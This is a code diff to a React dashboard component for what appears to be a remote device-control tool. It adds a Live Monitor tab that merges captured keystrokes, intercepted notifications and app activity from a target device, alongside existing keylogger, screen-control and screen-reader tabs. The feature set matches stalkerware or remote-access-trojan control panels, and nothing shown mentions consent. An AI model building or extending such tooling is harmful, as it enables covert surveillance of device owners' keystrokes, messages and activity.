@@ -7,19 +7,25 @@ import KeyloggerTab from './KeyloggerTab.jsx';
 import AppManager from './AppManager.jsx';
 import AppMonitorTab from './AppMonitorTab.jsx';
 import PermissionsTab from './PermissionsTab.jsx';
+import NotificationsTab from './NotificationsTab.jsx';
+import RecentActivityTab from './RecentActivityTab.jsx';
+import LiveMonitor from './LiveMonitor.jsx';
 
 const TABS = [
+  { id: 'live_monitor',  label: '📊 Live Monitor' },
   { id: 'commands',      label: '⌨️ Commands' },
   { id: 'screen_control',label: '🖥️ Screen Control' },
   { id: 'screen_reader', label: '📺 Screen Reader' },
+  { id: 'notifications', label: '🔔 Notifications' },
+  { id: 'activity',      label: '📱 Activity' },
   { id: 'keylogger',     label: '⌨️ Keylogger' },
   { id: 'app_manager',   label: '📦 App Manager' },
   { id: 'app_monitor',   label: '📡 App Monitor' },
   { id: 'permissions',   label: '🛡️ App Mode' },
 ];
 
-export default function DeviceControl({ device, sendCommand, results, pending, onBack, streamFrame, send, keylogPushEntries }) {
-  const [activeTab, setActiveTab] = useState('commands');
+export default function DeviceControl({ device, sendCommand, results, pending, onBack, streamFrame, send, keylogPushEntries, notifPushEntries, activityAppEntries }) {
+  const [activeTab, setActiveTab] = useState('live_monitor');
   const info     = device.deviceInfo || {};
   const isOnline = device.isOnline;
 
@@ -87,6 +93,14 @@ export default function DeviceControl({ device, sendCommand, results, pending, o
         ))}
       </div>
 
+      {activeTab === 'live_monitor' && (
+        <LiveMonitor
+          notifEntries={notifPushEntries || []}
+          activityEntries={activityAppEntries || []}
+          keylogEntries={keylogPushEntries || []}
+        />
+      )}
+
       {activeTab === 'commands' && (
         <div className="dc-layout">
           <CommandPanel
@@ -112,6 +126,22 @@ export default function DeviceControl({ device, sendCommand, results, pending, o
           device={device}
           sendCommand={sendCommand}
           results={results}
+        />
+      )}
+
+      {activeTab === 'notifications' && (
+        <NotificationsTab
+          device={device}
+          sendCommand={sendCommand}
+          results={results}
+          notifPushEntries={notifPushEntries || []}
+        />
+      )}
+
+      {activeTab === 'activity' && (
+        <RecentActivityTab
+          device={device}
+          activityEntries={activityAppEntries || []}
         />
       )}
 
